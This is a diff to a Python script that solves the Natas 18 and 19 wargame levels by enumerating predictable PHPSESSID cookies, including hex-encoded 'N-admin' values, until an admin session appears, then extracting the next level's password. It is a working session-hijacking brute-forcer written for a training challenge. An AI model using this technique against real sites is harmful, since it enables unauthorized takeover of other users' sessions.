@@ -1,78 +1,86 @@
 #!/usr/bin/env python3
 import argparse
 import requests
+import binascii
 import time
+import re
+
+
+def generate_session_id(i: int, mode: str) -> str:
+    """
+    Generate PHPSESSID value depending on challenge mode.
+    """
+    if mode == "18":
+        return str(i)
+    elif mode == "19":
+        return binascii.hexlify(f"{i}-admin".encode()).decode()
+    else:
+        raise ValueError("Invalid mode. Use 18 or 19.")
 
 
 def parse_args():
     parser = argparse.ArgumentParser(
-        description="Enumerate predictable PHP session IDs (Natas 18)."
+        description="Enumerate PHP session IDs for Natas 18 / 19"
     )
 
-    parser.add_argument("url", help="Target URL")
-    parser.add_argument("user", help="HTTP auth username")
-    parser.add_argument("password", help="HTTP auth password")
+    parser.add_argument("--url", required=True, help="Target URL")
+    parser.add_argument("--user", default="natas18", help="Username (default: natas18)")
+    parser.add_argument("--password", required=True, help="HTTP auth password")
 
     parser.add_argument(
-        "--cookie-name",
-        default="PHPSESSID",
-        help="Session cookie name (default: PHPSESSID)"
+        "--mode",
+        choices=["18", "19"],
+        required=True,
+        help="Natas level (18 or 19)"
     )
 
-    parser.add_argument(
-        "--start",
-        type=int,
-        default=1,
-        help="Starting session ID"
-    )
-
-    parser.add_argument(
-        "--end",
-        type=int,
-        default=640,
-        help="Ending session ID"
-    )
-
+    parser.add_argument("--start", type=int, default=1)
+    parser.add_argument("--end", type=int, default=640)
+    parser.add_argument("--delay", type=float, default=0.05)
     parser.add_argument(
         "--match",
         default="You are an admin",
-        help="String indicating admin access"
-    )
-
-    parser.add_argument(
-        "--delay",
-        type=float,
-        default=0.05,
-        help="Delay between requests"
+        help="String indicating successful admin session"
     )
 
     return parser.parse_args()
 
 
-def enumerate_sessions(args):
-    print("[*] Starting session enumeration")
-    print(f"[*] Target URL: {args.url}")
-    print(f"[*] Session range: {args.start} → {args.end}")
-    print(f"[*] Match string: \"{args.match}\"")
+def main():
+    args = parse_args()
+
+    print(f"[*] Target: {args.url}")
+    print(f"[*] Mode: Natas {args.mode}")
+    print(f"[*] Range: {args.start} → {args.end}")
     print()
 
-    for sid in range(args.start, args.end + 1):
+    for i in range(args.start, args.end + 1):
+        sid = generate_session_id(i, args.mode)
+
         try:
-            response = requests.get(
+            r = requests.get(
                 args.url,
-                cookies={args.cookie_name: str(sid)},
                 auth=(args.user, args.password),
-                timeout=5
+                cookies={"PHPSESSID": sid},
+                timeout=6
             )
         except requests.RequestException:
             continue
 
-        if args.match in response.text:
-            print(f"[+] Valid session found: {args.cookie_name}={sid}")
+        if args.match in r.text:
+            print("\n[+] ADMIN SESSION FOUND")
+            print(f"    ID        : {i}")
+            print(f"    PHPSESSID : {sid}")
+
+            # Try extracting next-level password (Natas 19 behavior)
+            match = re.search(r"password for natas\d+\s*is\s*<b>([^<]+)</b>", r.text)
+            if match:
+                print(f"    PASSWORD  : {match.group(1)}")
+
             return
 
-        if sid % 50 == 0:
-            print(f"[*] Tested up to {sid}")
+        if i % 50 == 0:
+            print(f"[*] Tried up to {i}")
 
         time.sleep(args.delay)
 
@@ -80,5 +88,4 @@ def enumerate_sessions(args):
 
 
 if __name__ == "__main__":
-    args = parse_args()
-    enumerate_sessions(args)
+    main()
